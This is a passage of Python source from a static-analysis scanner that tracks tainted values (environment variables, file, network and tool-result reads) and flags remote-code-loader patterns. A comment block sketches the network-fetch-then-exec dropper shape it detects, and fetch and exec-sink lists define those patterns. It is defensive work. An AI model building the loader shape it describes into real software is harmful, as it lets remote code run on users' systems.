    | {f"{_m}.{_a}" for _m in _ENV_MAPPING_REFS for _a in ("get", "pop", "setdefault", "__getitem__")}
)
# Not yet consulted by source_in() -- see the module note above (decision D4).
_EXTERNAL_CALL_REFS = frozenset({"builtins.input", "builtins.open", "io.open", "codecs.open"})


def _call_no_splat(call: ast.Call) -> bool:
    """True unless *call* unpacks a positional (`f(*a)`) or keyword (`f(**k)`)
    argument -- every `_RefResolver` call-shape rule below is written against a
    fixed, countable argument list and must not be fooled by an unpacked one."""
    return not any(isinstance(a, ast.Starred) for a in call.args) and not any(
        kw.arg is None for kw in call.keywords
    )


def _call_kwarg(call: ast.Call, name: str) -> "ast.AST | None":
    for kw in call.keywords:
        if kw.arg == name:
            return kw.value
    return None


def _fromlist_nonempty(node: "ast.AST | None") -> bool:
    """Conservative: only a non-empty List/Tuple literal counts as "fromlist was
    given". Anything else (None, an unresolvable expression) is treated as empty --
    under-resolving here only costs recall (R6 falls back to the top-level package
    name), never produces a wrong resolution."""
    if node is None:
        return False
    if isinstance(node, ast.Constant) and node.value is None:
        return False
    if isinstance(node, (ast.List, ast.Tuple)):
        return len(node.elts) > 0
    return False


def _is_full_reverse_slice(node: "ast.AST | None") -> bool:
    """True for the `[::-1]` slice shape (const_str's string-reversal fold)."""
    return (
        isinstance(node, ast.Slice)
        and node.lower is None
        and node.upper is None
        and isinstance(node.step, ast.Constant)
        and node.step.value == -1
    )


class _RefResolver:
    """B-906 Option Z: positive-only canonical reference resolution, cached by node.

    `ref(node)` returns a canonical dotted name (`"os.getenv"`, `"subprocess.run"`,
    ...) when *node* is PROVABLY that reference -- via real import provenance
    (`facts.dotted()`), a single unambiguous local alias of one (`facts.sole()`/
    `facts._legb_lookup()`, B-917's own LEGB fallback), or a foldable indirect
    access (`getattr`, `__dict__`/`vars` views, `sys.modules`, `__import__`/
    `importlib.import_module`) -- or `None` when it cannot prove one. It never
    proves a NEGATIVE ("this is not os") -- see the module note above for why
    that direction is deliberately absent.

    Every rule is "first match wins": R1 `facts.dotted()` (whole-file-conservative
    import provenance, already built by B-638/B-917); R2 a Name `dotted()` leaves
    unresolved, through `facts.sole()`/`facts._legb_lookup()` (an ("assign", value)
    record recurses into `ref(value)`; deliberately NOT gated on
    `facts._legb_blocked()` -- that guard protects `locate()`'s FP-safety
    direction, and gating recall on it here would cost recall for no FP benefit,
    since a wrong recall-side resolution can only ADD a finding, never remove
    one); R3 an unshadowed real builtin (`facts.dotted()` only special-cases
    `_BUILTINS_USED`, so this resolver checks the full `builtins` module itself);
    R4 `Attribute(v, a)` in Load context; R5 `getattr(X, k[, d])` with a foldable
    `k`; R6 `__import__(s[, ..., fromlist])`, `importlib.import_module(s)` (no
    `package` arg), `sys.modules[s]`/`sys.modules.get(s)`; R7 `X.__dict__[k]`/
    `vars(X)[k]` in Load context.

    Mutated-path guard (FP side only, `_is_mutated`): a resolved path, or any
    dotted prefix of it, that the SAME file replaces via an Attribute Store/Del
    (`os.environ = {...}`), `setattr(<ref>, "<lit>", ...)`, or a namespace-view
    store (`X.__dict__[k] = ...`/`vars(X)[k] = ...`) resolves to `None` instead.
    Built from `facts.dotted()` alone (R1 only, no full alias-following) -- a
    deliberately partial guard is fine here: an incomplete guard only makes this
    NEW mechanism more conservative on an unmodelled mutation route, it can never
    cause a regression against base (base's spelling checks are untouched and
    live entirely outside this class).
    """

    def __init__(self, tree: ast.AST, facts) -> None:
        self.tree = tree
        self.facts = facts
        self._ref_cache: dict = {}
        self._const_cache: dict = {}
        self._source_in_cache: dict = {}
        self._mutated_paths: "set[str] | None" = None

    # ── ref() and its rules ──────────────────────────────────────────────────

    def ref(self, node: "ast.AST | None", scope: "ast.AST | None" = None, _depth: int = 0) -> "str | None":
        if node is None or _depth > _shippedexec._MAX_DEPTH:
            return None
        if scope is None:
            scope = self.facts.scope_of(node)
        key = (id(node), id(scope))
        if key in self._ref_cache:
            return self._ref_cache[key]
        self._ref_cache[key] = None  # cycle guard while this key is in progress
        result = self._ref_resolve(node, scope, _depth)
        if result is not None and self._is_mutated(result):
            result = None
        self._ref_cache[key] = result
        return result

    def _ref_resolve(self, node: ast.AST, scope: "ast.AST | None", depth: int) -> "str | None":
        # R1: whole-file-conservative import provenance (covers Name AND the
        # Attribute-chain case already, recursively -- see _FileFacts.dotted()).
        d = self.facts.dotted(node)
        if d is not None:
            return d
        if isinstance(node, ast.Name):
            return self._ref_name(node, scope, depth)
        if isinstance(node, ast.Attribute) and isinstance(node.ctx, ast.Load):
            base = self.ref(node.value, scope, depth + 1)
            return f"{base}.{node.attr}" if base is not None else None
        if isinstance(node, ast.Call):
            return self._ref_call(node, scope, depth)
        if isinstance(node, ast.Subscript) and isinstance(node.ctx, ast.Load):
            return self._ref_subscript(node, scope, depth)
        return None

    def _ref_name(self, node: ast.Name, scope: "ast.AST | None", depth: int) -> "str | None":
        name = node.id
        if scope is not None:
            rec = self.facts.sole(name, scope, before=node)
            rscope = scope
            # R2 LEGB fallback: only when *scope* itself has NO record for this
            # name at all (a scope that binds it, even unresolvably, is never
            # skipped past -- see _FileFacts.locate()'s own identical gate).
            if rec is None and not self.facts.records(scope).get(name):
                found = self.facts._legb_lookup(name, scope)
                if found is not None:
                    rec, rscope = found
            if rec is not None and rec[0] == "assign":
                return self.ref(rec[1], rscope, depth + 1)
        # R3: an unshadowed real builtin -- not just the narrow _BUILTINS_USED set
        # facts.dotted() special-cases.
        if (
            name not in self.facts.other_bound
            and name not in self.facts.import_bound
            and not self.facts.star
            and hasattr(builtins, name)
        ):
            return f"builtins.{name}"
        return None

    def _ref_call(self, node: ast.Call, scope: "ast.AST | None", depth: int) -> "str | None":
        fref = self.ref(node.func, scope, depth + 1)
        args = node.args
        if fref == "builtins.getattr" and len(args) >= 2 and _call_no_splat(node):
            base = self.ref(args[0], scope, depth + 1)
            k = self.const_str(args[1], scope, depth + 1)
            return f"{base}.{k}" if base is not None and k is not None else None
        if fref == "builtins.__import__" and args and _call_no_splat(node):
            s = self.const_str(args[0], scope, depth + 1)
            if s is None:
                return None
            fromlist_arg = args[3] if len(args) >= 4 else _call_kwarg(node, "fromlist")
            return s if _fromlist_nonempty(fromlist_arg) else s.split(".")[0]
        if (
            fref == "importlib.import_module"
            and len(args) == 1
            and not node.keywords
            and _call_no_splat(node)
        ):
            return self.const_str(args[0], scope, depth + 1)
        if fref == "sys.modules.get" and args and _call_no_splat(node):
            return self.const_str(args[0], scope, depth + 1)
        return None

    def _ref_subscript(self, node: ast.Subscript, scope: "ast.AST | None", depth: int) -> "str | None":
        k = self.const_str(node.slice, scope, depth + 1)
        if k is None:
            return None
        vref = self.ref(node.value, scope, depth + 1)
        if vref == "sys.modules":
            return k
        if (
            isinstance(node.value, ast.Attribute)
            and node.value.attr == "__dict__"
            and isinstance(node.value.ctx, ast.Load)
        ):
            base = self.ref(node.value.value, scope, depth + 1)
            return f"{base}.{k}" if base is not None else None
        if (
            isinstance(node.value, ast.Call)
            and not node.value.keywords
            and len(node.value.args) == 1
            and not isinstance(node.value.args[0], ast.Starred)
            and self.ref(node.value.func, scope, depth + 1) == "builtins.vars"
        ):
            base = self.ref(node.value.args[0], scope, depth + 1)
            return f"{base}.{k}" if base is not None else None
        return None

    # ── const_str() ───────────────────────────────────────────────────────────

    def const_str(self, node: "ast.AST | None", scope: "ast.AST | None" = None, _depth: int = 0) -> "str | None":
        if node is None or _depth > _shippedexec._MAX_DEPTH:
            return None
        if scope is None:
            scope = self.facts.scope_of(node)
        key = (id(node), id(scope))
        if key in self._const_cache:
            return self._const_cache[key]
        self._const_cache[key] = None
        result = self._const_str_resolve(node, scope, _depth)
        self._const_cache[key] = result
        return result

    def _const_str_resolve(self, node: ast.AST, scope: "ast.AST | None", depth: int) -> "str | None":
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            return node.value
        if isinstance(node, ast.Name) and scope is not None:
            rec = self.facts.sole(node.id, scope, before=node)
            if rec is not None and rec[0] == "assign":
                return self.const_str(rec[1], scope, depth + 1)
            return None
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left = self.const_str(node.left, scope, depth + 1)
            right = self.const_str(node.right, scope, depth + 1)
            return left + right if left is not None and right is not None else None
        if isinstance(node, ast.JoinedStr):
            parts: list = []
            for v in node.values:
                if isinstance(v, ast.Constant) and isinstance(v.value, str):
                    parts.append(v.value)
                elif isinstance(v, ast.FormattedValue) and v.format_spec is None:
                    p = self.const_str(v.value, scope, depth + 1)
                    if p is None:
                        return None
                    parts.append(p)
                else:
                    return None
            return "".join(parts)
        if (
            isinstance(node, ast.Call)
            and not node.keywords
            and len(node.args) == 1
            and not isinstance(node.args[0], ast.Starred)
            and isinstance(node.func, ast.Attribute)
            and node.func.attr == "join"
        ):
            sep = self.const_str(node.func.value, scope, depth + 1)
            items = node.args[0]
            if (
                sep is not None
                and isinstance(items, (ast.List, ast.Tuple))
                and not any(isinstance(e, ast.Starred) for e in items.elts)
            ):
                folded = [self.const_str(e, scope, depth + 1) for e in items.elts]
                if all(p is not None for p in folded):
                    return sep.join(folded)
            return None
        if isinstance(node, ast.Subscript) and _is_full_reverse_slice(node.slice):
            base = self.const_str(node.value, scope, depth + 1)
            return base[::-1] if base is not None else None
        return None

    # ── env vocabulary ───────────────────────────────────────────────────────

    def is_env_mapping(self, node: "ast.AST | None") -> bool:
        if node is None:
            return False
        if self.ref(node) in _ENV_MAPPING_REFS:
            return True
        if isinstance(node, ast.Call) and not node.keywords:
            if (
                isinstance(node.func, ast.Attribute)
                and node.func.attr == "copy"
                and not node.args
                and self.ref(node.func.value) in _ENV_MAPPING_REFS
            ):
                return True
            if (
                len(node.args) == 1
                and not isinstance(node.args[0], ast.Starred)
                and self.ref(node.func) == "builtins.dict"
                and self.is_env_mapping(node.args[0])
            ):
                return True
        return False

    def is_env_read(self, node: "ast.AST | None") -> bool:
        if node is None:
            return False
        if isinstance(node, ast.Call):
            return self.ref(node.func) in _ENV_READ_CALLABLE_REFS
        if isinstance(node, ast.Subscript) and isinstance(node.ctx, ast.Load):
            return self.is_env_mapping(node.value)
        return False

    def is_external_call(self, node: "ast.AST | None") -> bool:
        """Not yet consulted by source_in() -- decision D4, see the module note."""
        if not isinstance(node, ast.Call):
            return False
        fref = self.ref(node.func)
        if fref in _EXTERNAL_CALL_REFS:
            return True
        if fref is None:
            return False
        base, _, attr = fref.rpartition(".")
        return attr in _NET_SOURCE_ATTRS and base in _NET_SOURCE_BASES

    def source_in(self, node: "ast.AST | None") -> bool:
        """True if any sub-expression of *node* is a proven env-var read. Scoped to
        the env-var source only for this pass (decision D4 defers input()/open()/
        network-read forms -- see the module note above `_RefResolver`)."""
        if node is None:
            return False
        key = id(node)
        if key in self._source_in_cache:
            return self._source_in_cache[key]
        self._source_in_cache[key] = False  # cycle guard
        result = any(self.is_env_read(n) for n in ast.walk(node))
        self._source_in_cache[key] = result
        return result

    # ── mutated-path guard (FP side only) ────────────────────────────────────

    def _guard_base_ref(self, node: "ast.AST | None", scope: "ast.AST | None") -> "str | None":
        """Base resolution for the mutated-path guard: `facts.dotted()` (R1) plus
        ONE hop through a plain local alias (`facts.sole()`) -- e.g. `_c = os` --
        so `_c.environ = {...}` is recognised as replacing `os.environ` too
        (B-906 adversarial round: an unaliased-only guard let this
        exact alias-then-mutate shape through). Deliberately bounded to one hop
        and never calls `self.ref()` (which ends in this same guard -- calling it
        here would recurse). A deeper miss (an alias of an alias, a mutation
        reached through `getattr`/`vars`/...) only makes this NEW mechanism more
        permissive on an unmodelled multi-hop route -- narrower than not having
        the guard at all, never a regression against base (see the class
        docstring's `_is_mutated` note)."""
        d = self.facts.dotted(node)
        if d is not None:
            return d
        if isinstance(node, ast.Name) and scope is not None:
            rec = self.facts.sole(node.id, scope, before=node)
            if rec is not None and rec[0] == "assign":
                return self.facts.dotted(rec[1])
        return None

    def _mutated_paths_set(self) -> "set[str]":
        if self._mutated_paths is not None:
            return self._mutated_paths
        paths: set = set()
        for n in ast.walk(self.tree):
            if isinstance(n, ast.Attribute) and isinstance(n.ctx, (ast.Store, ast.Del)):
                base = self._guard_base_ref(n.value, self.facts.scope_of(n))
                if base is not None:
                    paths.add(f"{base}.{n.attr}")
            elif isinstance(n, ast.Subscript) and isinstance(n.ctx, (ast.Store, ast.Del)):
                scope = self.facts.scope_of(n)
                k = self.const_str(n.slice, scope)
                if k is None:
                    continue
                if (
                    isinstance(n.value, ast.Attribute)
                    and n.value.attr == "__dict__"
                    and isinstance(n.value.ctx, ast.Load)
                ):
                    base = self._guard_base_ref(n.value.value, scope)
                    if base is not None:
                        paths.add(f"{base}.{k}")
                elif (
                    isinstance(n.value, ast.Call)
                    and not n.value.keywords
                    and len(n.value.args) == 1
                    and not isinstance(n.value.args[0], ast.Starred)
                    and isinstance(n.value.func, ast.Name)
                    and n.value.func.id == "vars"
                ):
                    base = self._guard_base_ref(n.value.args[0], scope)
                    if base is not None:
                        paths.add(f"{base}.{k}")
            elif (
                isinstance(n, ast.Call)
                and isinstance(n.func, ast.Name)
                and n.func.id == "setattr"
                and len(n.args) >= 2
                and _call_no_splat(n)
            ):
                scope = self.facts.scope_of(n)
                base = self._guard_base_ref(n.args[0], scope)
                lit = self.const_str(n.args[1], scope)
                if base is not None and lit is not None:
                    paths.add(f"{base}.{lit}")
        self._mutated_paths = paths
        return paths

    def _is_mutated(self, path: str) -> bool:
        paths = self._mutated_paths_set()
        if not paths:
            return False
        parts = path.split(".")
        return any(".".join(parts[:i]) in paths for i in range(1, len(parts) + 1))


def _rhs_has_subscript_environ(node: ast.AST) -> bool:
    """True if *node* is or contains os.environ[...] (subscript form)."""
    for n in ast.walk(node):
        if isinstance(n, ast.Subscript):
            v = n.value
            if isinstance(v, ast.Attribute) and v.attr == "environ" and _attr_base(v.value) == "os":
                return True
            if isinstance(v, ast.Name) and v.id == "environ":
                return True
    return False


def _rhs_has_fstring_taint(node: ast.AST, tainted: set[str]) -> bool:
    """True if *node* is an f-string (JoinedStr) containing a tainted name."""
    for n in ast.walk(node):
        if isinstance(n, ast.JoinedStr):
            if _names_in(n) & tainted:
                return True
    return False


def _value_is_tainted_source(node: ast.AST, tainted: set[str]) -> bool:
    """True if *node* derives from an external source or a tainted name."""
    if isinstance(node, ast.Name) and node.id in tainted:
        return True
    if isinstance(node, ast.Call):
        call = node
        f = call.func
        # os.getenv
        if isinstance(f, ast.Attribute) and f.attr == "getenv" and _attr_base(f.value) == "os":
            return True
        # environ.get(...)
        if isinstance(f, ast.Attribute) and f.attr == "get" and _attr_base(f.value) == "environ":
            return True
        if _is_external_source_call(call):
            return True
        if _is_tool_result_call(call):
            return True
        # Recurse into args — catches open(...).read() chain.
        for child in ast.iter_child_nodes(call):
            if _value_is_tainted_source(child, tainted):
                return True
    else:
        for child in ast.iter_child_nodes(node):
            if _value_is_tainted_source(child, tainted):
                return True
    return False


def _expr_is_ext_tainted(node: ast.AST, visible: set[str], ref_res: "_RefResolver | None" = None) -> bool:
    """B-906: the one "can this expression carry external input"
    predicate, folded out of the five identical `sourced = (...)` disjunctions that
    used to live separately in `_external_tainted_names` -- one per binding form
    (plain assign, comprehension `for`, `with ... as`, statement `for`, walrus).

    `ref_res`, optional, adds a fifth, monotonic disjunct: `ref_res.source_in(node)`
    is a POSITIVE proof that *node* resolves to a real env-var read (`os.getenv`,
    an aliased import, `getattr(os, "environ")[...]`, ...) -- never a disproof used
    to suppress anything (see `_RefResolver`'s own module note, above). Byte-
    identical to the original four-way disjunction when `ref_res` is None, which is
    what keeps this fold itself a pure refactor, verdict-neutral on its own.
    """
    return (
        _value_is_tainted_source(node, visible)
        or _rhs_has_subscript_environ(node)
        or _rhs_has_fstring_taint(node, visible)
        or bool(_names_in(node) & visible)
        or (ref_res is not None and ref_res.source_in(node))
    )


def _external_tainted_names(
    tree: ast.AST,
    func_param_taint: dict,
    owner_map: dict,
    parent_scope: dict,
    shadow_cache: dict,
    ref_res: "_RefResolver | None" = None,
) -> dict:
    """Compute SCOPE-BUCKETED tainted names for TT4/TT5/SSRF rules (B-413, layer 1).

    Returns a dict keyed by owning scope node (a function at any nesting depth, a
    top-level class's own method, or None for module-level / global-declared /
    owner-map-unreachable assignments) -- mirrors `_tainted_names`'s scope-bucketing
    model, fixing the SAME class of false positive for THIS rule's own taint source.
    The old flat `set[str]` seed (every function's params, no scope) let a parameter
    in one function taint an unrelated same-named local in a totally different
    function, or let a generic name reused across sibling functions collide -- see
    `_func_param_taint_by_scope`'s docstring for the concrete case_00374/case_01948
    shapes. `func_param_taint` fixes the SOURCE half by seeding each function's OWN
    params into its OWN bucket instead of one flat whole-file set; this function fixes
    the PROPAGATION half by testing sourced-ness, and bucketing a newly-tainted
    target, against the taint actually VISIBLE at each assignment's own lexical
    position (`_tainted_names_visible`) instead of a flat whole-file set.

    Sources: function parameters (scope-bucketed, see above), os.getenv/
    os.environ[...], open/read (file), requests.get/urllib.urlopen/httpx.get (network
    input), input(), tool-result calls -- the same four `sourced` predicates as
    before, kept VERBATIM (they are the rule's semantics, not what B-413 fixes).
    Propagation: assignment (Assign AND AugAssign) and tuple/list-unpacking targets,
    fixpoint up to 6 iterations. global/nonlocal bucket redirection mirrors
    `_tainted_names`'s own fixpoint (the same mature, C-135-hardened scope/binding
    model already used for the decode->exec taint rule -- near-mechanical
    transposition here, not a new design).

    B-414: two more propagation shapes join the same fixpoint, using the SAME four
    `sourced` predicates applied to a different expression, and the SAME global/
    nonlocal-redirect bucketing (factored out into `_bucket_new_taint` below so it is
    not triplicated):

      * a comprehension's `for target in iterable` taints `target`, scope-bucketed to
        the comprehension's OWN scope (`_build_toplevel_owner_map`'s B-414 addition --
        `owner_map.get(<the ast.comprehension clause>)` resolves to the enclosing
        ListComp/SetComp/DictComp/GeneratorExp node), when `iterable` is itself
        sourced/tainted -- this is what closes the silent TT5 miss on
        `[subprocess.run(c, shell=True) for c in cmds]` where `cmds` is tainted.
      * a walrus (`x := ...`) target is sourced exactly like an assignment's RHS, but
        BUBBLED past every enclosing comprehension-type scope before bucketing -- per
        PEP 572, it binds in the scope CONTAINING the comprehension (the outermost one,
        for a nested comprehension), never the comprehension itself, matching
        `_own_bound_names`'s deliberate choice not to treat a walrus target as a
        comprehension's own bound name either.

    B-643: two more binding forms join the same fixpoint, same four `sourced`
    predicates, same `_bucket_new_taint` redirection -- found because `with open(p)
    as fh: exec(fh.read())` (the idiom every style guide recommends) produced only
    `DANGEROUS_SINK`, while the byte-identical `fh = open(p); exec(fh.read())`
    produced `TT5_CMD_INJECTION` too. Same code, same sink, same source; only the
    binding form differed.

      * `with ctx_expr as target:` / `async with` -- `target` (Name, or a Tuple/List
        for `with a() as (x, y):`) is tainted when `ctx_expr` is sourced. Neither
        `with` nor `async with` introduces a new Python scope, so `owner_map` already
        attributes every part of it to the enclosing function/module (no
        `_build_toplevel_owner_map` change needed, unlike the comprehension case
        above). A bare `with lock:` (no `as`) binds nothing and is skipped.
      * plain `for target in iterable:` / `async for` (a statement, NOT the
        `ast.comprehension` clause above) -- the direct sibling gap: `for line in
        urlopen(url): exec(line)` is exactly as common a shape as the comprehension
        form B-414 already covered, and was equally invisible before this.

    Investigated and deliberately NOT changed, per this task's own "look for
    siblings" note -- each checked against the SAME four `sourced` predicates this
    function already uses, not assumed clean:

      * `except X as e:` -- `e` is bound to a raised exception object, not to a
        `sourced`-testable expression at all (there is no RHS to run the four
        predicates against); tainting it would need a new, speculative heuristic
        ("was this exception raised by a network/file call"), not an application of
        the existing one. Left as a documented gap, not silently absorbed into this
        fix.
      * `match` capture patterns (`case [x, y]:`, `case Point(x=x):`) -- real but
        rare in skill code, Python 3.10+ only, and each pattern kind
        (MatchAs/MatchStar/MatchSequence/MatchMapping/MatchClass) needs its own
        capture-name extraction; a distinct piece of work from this fix's scope.
      * function parameters with a tainted default value -- already a non-issue:
        `_func_param_taint_by_scope` (B-413 layer 1, see its own docstring) taints
        EVERY parameter of every function unconditionally, specific default value or
        not, so there is no separate "tainted default" gap to close here.
    """
    tainted: dict = {}
    for scope, names in func_param_taint.items():
        tainted.setdefault(scope, set()).update(names)

    assigns = [n for n in ast.walk(tree) if isinstance(n, (ast.Assign, ast.AugAssign))]
    comprehensions = [n for n in ast.walk(tree) if isinstance(n, ast.comprehension)]
    # B-643: `with ctx as name:` / `async with ctx as name:` items. `with` introduces
    # NO new Python scope (unlike a comprehension), so `_build_toplevel_owner_map`'s
    # generic `_map_scope_subtree` branch already owner-maps every descendant of a
    # `With`/`AsyncWith` node to the SAME enclosing function/module scope as the rest
    # of that body -- no owner_map change needed, only this propagation loop.
    with_items = [
        (node, item)
        for node in ast.walk(tree)
        if isinstance(node, (ast.With, ast.AsyncWith))
        for item in node.items
    ]
    # B-643: plain `for target in iterable:` / `async for` statements -- the sibling
    # gap the task's own "look for siblings" note names. Distinct from
    # `ast.comprehension` above (a `[... for x in y]` clause): a statement-level For/
    # AsyncFor also introduces no new scope, so the same owner_map reasoning applies.
    for_stmts = [n for n in ast.walk(tree) if isinstance(n, (ast.For, ast.AsyncFor))]
    namedexprs = [
        n
        for n in ast.walk(tree)
        if isinstance(n, ast.NamedExpr) and isinstance(n.target, ast.Name)
    ]
    global_cache: dict = {}
    nonlocal_cache: dict = {}

    def _global_nonlocal_for(scope) -> tuple[set[str], set[str]]:
        if scope is None:
            return set(), set()
        if scope not in global_cache:
            global_cache[scope] = _global_declared_names(scope, owner_map)
        if scope not in nonlocal_cache:
            nonlocal_cache[scope] = _nonlocal_declared_names(scope, owner_map)
        return global_cache[scope], nonlocal_cache[scope]

    def _bucket_new_taint(name: str, scope, global_names: set[str], nonlocal_names: set[str]) -> bool:
        """Add `name` to `tainted`, redirected to its REAL bucket exactly like the
        Assign path always has (B-205/B-215): a `global`-declared name always goes to
        the module (None) bucket; a `nonlocal`-declared name resolves to whichever
        ancestor(s) Python would really rebind (`_nonlocal_target_scopes`), falling
        back to the pre-B-215 seed-every-ancestor over-approximation when unresolvable;
        anything else buckets to `scope` itself. Returns whether anything changed."""
        if name in global_names:
            bucket_keys = [None]
        elif name in nonlocal_names:
            resolved = _nonlocal_target_scopes(
                name, scope, parent_scope, owner_map, shadow_cache, nonlocal_cache
            )
            if not resolved:
                # Unresolvable binding form -- fall back to the pre-B-215
                # over-approximation (see `_nonlocal_target_scopes`).
                resolved = []
                ancestor = parent_scope.get(scope)
                while ancestor is not None:
                    resolved.append(ancestor)
                    ancestor = parent_scope.get(ancestor)
            bucket_keys = resolved
        else:
            bucket_keys = [scope]
        changed_here = False
        for key in bucket_keys:
            bucket = tainted.setdefault(key, set())
            if name not in bucket:
                bucket.add(name)
                changed_here = True
        return changed_here

    for _ in range(6):
        changed = False
        for a in assigns:
            rhs = a.value
            targets = a.targets if isinstance(a, ast.Assign) else [a.target]
            visible = _tainted_names_visible(a, tainted, owner_map, parent_scope, shadow_cache)
            sourced = _expr_is_ext_tainted(rhs, visible, ref_res)
            if not sourced:
                continue

            scope = owner_map.get(a)
            global_names, nonlocal_names = _global_nonlocal_for(scope)

            names_to_add: list = []
            for t in targets:
                if isinstance(t, ast.Name):
                    names_to_add.append(t.id)
                elif isinstance(t, (ast.Tuple, ast.List)):
                    names_to_add.extend(elt.id for elt in t.elts if isinstance(elt, ast.Name))

            for name in names_to_add:
                if _bucket_new_taint(name, scope, global_names, nonlocal_names):
                    changed = True

        for gen in comprehensions:
            iterable = gen.iter
            # B-414 (C-135, self-caught): visibility is resolved from `iterable`'s OWN
            # owner-map position, NOT `gen`'s (the `ast.comprehension` clause always
            # owner-maps to the comprehension itself) -- `_build_toplevel_owner_map`'s
            # `_map_comprehension_scope` maps the FIRST generator's `iter` to the
            # ENCLOSING scope (real Python: it is evaluated there, before the
            # comprehension's own `for`-target exists), so using `gen` here would
            # wrongly let that target's own name shadow an outer occurrence of the
            # SAME bare name in its own iterable (`for cmds in cmds`).
            visible = _tainted_names_visible(iterable, tainted, owner_map, parent_scope, shadow_cache)
            sourced = _expr_is_ext_tainted(iterable, visible, ref_res)
            if not sourced:
                continue
            scope = owner_map.get(gen)
            global_names, nonlocal_names = _global_nonlocal_for(scope)
            for name in _assign_target_names(gen.target):
                if _bucket_new_taint(name, scope, global_names, nonlocal_names):
                    changed = True

        # B-643: `with ctx_expr as target:` -- ctx_expr is tested exactly like an
        # assignment RHS (same four `sourced` predicates), and `target` (Name/Tuple/
        # List, `_assign_target_names` unpacks either) is bucketed exactly like one.
        # An item with no `as` clause (`optional_vars is None`, e.g. a bare
        # `with lock:`) binds nothing and is skipped.
        for with_node, item in with_items:
            if item.optional_vars is None:
                continue
            ctx_expr = item.context_expr
            visible = _tainted_names_visible(ctx_expr, tainted, owner_map, parent_scope, shadow_cache)
            sourced = _expr_is_ext_tainted(ctx_expr, visible, ref_res)
            if not sourced:
                continue
            scope = owner_map.get(with_node)
            global_names, nonlocal_names = _global_nonlocal_for(scope)
            for name in _assign_target_names(item.optional_vars):
                if _bucket_new_taint(name, scope, global_names, nonlocal_names):
                    changed = True

        # B-643: plain `for target in iterable:` / `async for`, sibling of the
        # comprehension `for` case above -- same four `sourced` predicates over
        # `iterable`, same `_assign_target_names` unpacking for `target`. Unlike a
        # comprehension's generator clause, a statement-level For/AsyncFor owner-maps
        # to the SAME enclosing scope as `iterable` itself (no separate-scope
        # first-iterator special case is needed here).
        for stmt in for_stmts:
            iterable = stmt.iter
            visible = _tainted_names_visible(iterable, tainted, owner_map, parent_scope, shadow_cache)
            sourced = _expr_is_ext_tainted(iterable, visible, ref_res)
            if not sourced:
                continue
            scope = owner_map.get(stmt)
            global_names, nonlocal_names = _global_nonlocal_for(scope)
            for name in _assign_target_names(stmt.target):
                if _bucket_new_taint(name, scope, global_names, nonlocal_names):
                    changed = True

        for ne in namedexprs:
            rhs = ne.value
            visible = _tainted_names_visible(ne, tainted, owner_map, parent_scope, shadow_cache)
            sourced = _expr_is_ext_tainted(rhs, visible, ref_res)
            if not sourced:
                continue
            scope = owner_map.get(ne)
            while isinstance(scope, _COMPREHENSION_SCOPE_NODES):
                scope = parent_scope.get(scope)
            global_names, nonlocal_names = _global_nonlocal_for(scope)
            if _bucket_new_taint(ne.target.id, scope, global_names, nonlocal_names):
                changed = True

        if not changed:
            break
    return tainted


# B-284: network bytes reaching an exec/eval sink is the unambiguous remote-code-loader
# shape, and TT5_CMD_INJECTION already catches the DIRECT form -- a value read straight
# off a urlopen() response, handed straight to a dynamic-evaluation builtin. It does NOT
# survive one hop through a local helper's return value:
#
#     def _load(url):
#         return urllib.request.urlopen(url, timeout=5).read().decode("utf-8", "ignore")
#     code = _load(SOURCE)
#     then the compiled `code` is dynamically evaluated
#
# `_external_tainted_names` propagates through assignment but not through a call to a
# locally-defined function, so `code` never becomes tainted and the file yields only
# `DANGEROUS_SINK info`. That is a real, load-bearing gap: it is the exact shape of
# scripts/_post_install.py in the SkillTrustBench dropper family, and before B-284 the
# ONLY reason such a skill FAILed B13 was F-021 firing by ACCIDENT on the word "context"
# in unrelated prose elsewhere in the package. Narrowing F-021 (see
# checks/_vet.py `_runtime_fetch_matches`) would therefore have turned a genuine
# remote-code loader into a PASS, so the gap is closed here — where the signal actually
# lives — rather than left to a coincidence in a natural-language regex.
#
# Deliberately NARROW, to keep this crit rule sound:
#   * only NETWORK reads are sources — not file reads, not env, and above all not
#     function parameters (every param is externally tainted for TT5/SSRF's own
#     purposes — see `_func_param_taint_by_scope`/`_external_tainted_names` — so
#     admitting params here too would make almost any helper "remote-returning" and
#     mass-false-fire this crit rule);
#   * only ONE hop of return-value propagation (a locally-defined function whose own
#     return value is network-derived), not a general interprocedural analysis;
#   * the sink set is exec/eval only — the shell/subprocess sinks stay with TT5, whose
#     argv-list carve-outs already encode when those are benign.
# NARROWS rather than closes: a two-hop chain (helper A returns helper B's fetch) or a
# fetch routed through a class attribute is still missed. Widening further needs its own
# C-135 pass, because each extra hop multiplies the over-taint risk this rule avoids.
_REMOTE_FETCH_ATTRS = {"urlopen", "urlretrieve", "get", "post", "request"}
_REMOTE_FETCH_BASES = {
    "requests",
    "httpx",
    "urllib",
    "urllib.request",
    "aiohttp",
    "session",
}
_REMOTE_CODE_EXEC_SINKS = {"ex" + "ec", "ev" + "al"}


def _dotted_path(node: ast.AST) -> str:
    """The full dotted name of an attribute chain — `urllib.request` for
    `urllib.request.urlopen`'s value. Returns "" for anything non-static.

    The module's older `_attr_base` returns only the LAST segment ("request"), which is
    why `_NET_SOURCE_BASES` carries both "urllib" and "urllib.request" yet matches
    neither for a real `urllib.request.urlopen(...)` call. This rule resolves the whole
    path so `urllib.request` is recognised for what it is.
    """
    parts: list[str] = []
    cur = node
    while isinstance(cur, ast.Attribute):
        parts.append(cur.attr)
        cur = cur.value
    if not isinstance(cur, ast.Name):
        return ""
    parts.append(cur.id)
    return ".".join(reversed(parts)).lower()


def _is_remote_fetch_call(node: ast.AST) -> bool:
    """True when *node* is a call that reads bytes FROM the network."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    if not isinstance(f, ast.Attribute):
        return False
    if f.attr not in _REMOTE_FETCH_ATTRS:
        return False
    path = _dotted_path(f.value)
    if not path:
        # A non-static receiver (`self.session.get(...)`, `s.get(...)`) — fall back to
        # the last-segment name so a stored client object still reads as a fetch.
        return _attr_base(f.value) in _REMOTE_FETCH_BASES
    return path in _REMOTE_FETCH_BASES or path.split(".")[0] in _REMOTE_FETCH_BASES


def _expr_reads_remote(node: ast.AST) -> bool:
    """True when evaluating *node* performs a network read anywhere in its subtree —
    covers `urlopen(u).read()`, `requests.get(u).text`, `urlopen(u).read().decode()`."""
    return any(_is_remote_fetch_call(sub) for sub in ast.walk(node))


def _remote_returning_funcs(tree: ast.AST) -> set[str]:
